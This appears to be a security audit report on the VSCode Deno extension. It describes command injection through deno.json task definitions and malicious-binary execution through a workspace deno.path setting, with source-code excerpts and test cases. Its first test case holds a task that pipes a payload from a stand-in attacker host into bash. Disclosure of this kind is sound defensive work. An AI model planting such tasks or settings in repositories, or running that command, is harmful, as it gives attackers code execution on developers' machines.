# Vulnerabilities in VSCode Deno Extension

## 1. Command Injection via Task Definitions in `deno.json`

### Description
The VSCode Deno extension reads task definitions from `deno.json` files and makes them available in VS Code's task system. When a user executes a task, the command defined in the task is processed without proper validation or sanitization. This allows an attacker to craft a repository with malicious task definitions that, when executed, run arbitrary commands on the victim's system.

A threat actor can create a malicious repository containing a crafted `deno.json` file with task definitions that execute harmful commands. When the victim opens the repository and runs one of these tasks (which can be made to look harmless), arbitrary code execution occurs on the victim's machine.

The extension uses the task system in VS Code to make tasks defined in Deno configuration files accessible to users. The task execution flow in the extension does not validate or sanitize the commands before execution.

### Impact
An attacker could achieve Remote Code Execution on the victim's system. This could lead to data theft, system compromise, lateral movement within a network, or installation of additional malware.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension requires explicit user action to run tasks, which provides some level of mitigation. However, users might not understand the implications of running a task from an untrusted repository.

### Missing Mitigations
- No validation of task commands to ensure they are safe to execute
- No warning prompts when running tasks from repositories that are not trusted
- No sandboxing of task execution to limit privileges

### Preconditions
1. Victim must open a repository containing a malicious `deno.json` file
2. Victim must either enable Deno for the workspace or manually run a task

### Source Code Analysis
In `tasks_sidebar.ts`, the extension reads task definitions from Deno configuration files:

```typescript
async provideTasks(): Promise<Task[]> {
  const process = await getDenoCommandName();
  const client = this.#extensionContext.client;
  const supportsConfigTasks = this.#extensionContext.serverCapabilities
    ?.experimental?.denoConfigTasks;
  if (!client || !supportsConfigTasks) {
    return [];
  }
  const tasks = [];
  try {
    const configTasks = await client.sendRequest(taskReq);
    for (const configTask of configTasks ?? []) {
      const task = buildDenoConfigTask(
        workspaceFolder,
        process,
        configTask.name,
        configTask.command ?? configTask.detail,
        Uri.parse(configTask.sourceUri),
      );
      tasks.push(task);
    }
  } catch (err) {
    // error handling
  }
  return tasks;
}
```

The `buildDenoConfigTask` function in `tasks.ts` then creates task objects without validating command content:

```typescript
export function buildDenoConfigTask(
  scope: vscode.WorkspaceFolder,
  process: string,
  name: string,
  command: string | undefined,
  sourceUri?: vscode.Uri,
): vscode.Task {
  // code that builds task arguments
  const task = new vscode.Task(
    {
      type: TASK_TYPE,
      name: name,
      command: "task",
      args,
      sourceUri,
    },
    scope,
    name,
    TASK_SOURCE,
    new vscode.ProcessExecution(process, ["task", ...args]),
    ["$deno"],
  );
  task.detail = `$ ${command}`;
  return task;
}
```

When a user runs the task (via the command palette, tasks sidebar, or task code lens), the command executes without any validation.

### Security Test Case
1. Create a repository with a `deno.json` file containing a malicious task:
   ```json
   {
     "tasks": {
       "innocent-looking-task": "echo 'Compromised!' && curl https://malicious.example/payload | bash"
     }
   }
   ```
2. Share this repository with a victim
3. When the victim opens the repository in VS Code with the Deno extension installed
4. The task will appear in the VS Code Tasks list and Tasks sidebar
5. If the victim runs the task, the malicious command will execute on their system
6. The command will display a message and download+execute a payload from the attacker's server

## 2. Command Injection via Custom Deno Path

### Description
The extension resolves the Deno executable path from the configuration without validating that it points to a legitimate Deno executable. A threat actor can create a malicious repository that includes a malicious executable and configure the VS Code workspace to use this executable instead of the actual Deno runtime.

This vulnerability exists because the extension gets the path from workspace configuration with minimal validation and without verifying that it's pointing to a legitimate Deno executable. If the path is relative, it resolves it relative to the workspace folders, allowing a repository to include a malicious executable and configure `deno.path` to point to it.

### Impact
An attacker could achieve Remote Code Execution with the privileges of the victim. This could be used to steal sensitive information, compromise the system, or establish persistence.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
Users need to explicitly trust workspace settings when opening repositories. However, users might not understand the implications of the `deno.path` setting.

### Missing Mitigations
- No validation that the configured Deno path points to a legitimate Deno executable
- No warning prompts when non-standard Deno paths are configured
- No path sanitization to prevent execution of unexpected executables

### Preconditions
1. Victim must open a malicious repository in VS Code
2. The repository must contain a workspace configuration that sets `deno.path` to a malicious executable
3. The malicious executable must be available on the victim's system (e.g., included in the repository)
4. Deno extension must attempt to use the configured Deno path

### Source Code Analysis
In `util.ts`, the extension resolves the Deno executable path from the configuration:

```typescript
export async function getDenoCommandPath() {
  const command = getWorkspaceConfigDenoExePath();
  const workspaceFolders = workspace.workspaceFolders;
  if (!command || !workspaceFolders) {
    return command ?? await getDefaultDenoCommand();
  } else if (!path.isAbsolute(command)) {
    // if sent a relative path, iterate over workspace folders to try and resolve.
    for (const workspace of workspaceFolders) {
      const commandPath = path.resolve(workspace.uri.fsPath, command);
      if (await fileExists(commandPath)) {
        return commandPath;
      }
    }
    return undefined;
  } else {
    return command;
  }
}

function getWorkspaceConfigDenoExePath() {
  const exePath = workspace.getConfiguration(EXTENSION_NS)
    .get<string>("path");
  // it is possible for the path to be blank. In that case, return undefined
  if (typeof exePath === "string" && exePath.trim().length === 0) {
    return undefined;
  } else {
    return exePath;
  }
}
```

The extension then uses this path to spawn processes in various places, for example in `commands.ts`:

```typescript
const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  debug: {
    command,
    args: ["lsp"],
    options: { env },
  },
};
```

This path is used without validation to spawn processes, creating a direct path to command execution.

### Security Test Case
1. Create a repository with the following structure:
   - A malicious executable named `fake-deno.exe` (for Windows) or `fake-deno` (for macOS/Linux)
   - A `.vscode/settings.json` file with the following content:
     ```json
     {
       "deno.enable": true,
       "deno.path": "${workspaceFolder}/fake-deno.exe"
     }
     ```
2. Make the malicious executable look like it's responding to Deno commands but actually perform malicious actions
3. Share the repository with a victim
4. When the victim opens the repository in VS Code:
   - The Deno extension will read the configuration
   - It will resolve the custom Deno path to the malicious executable
   - When it tries to start the language server or execute any Deno command, it will run the malicious executable instead
   - The malicious code will execute with the victim's system privileges
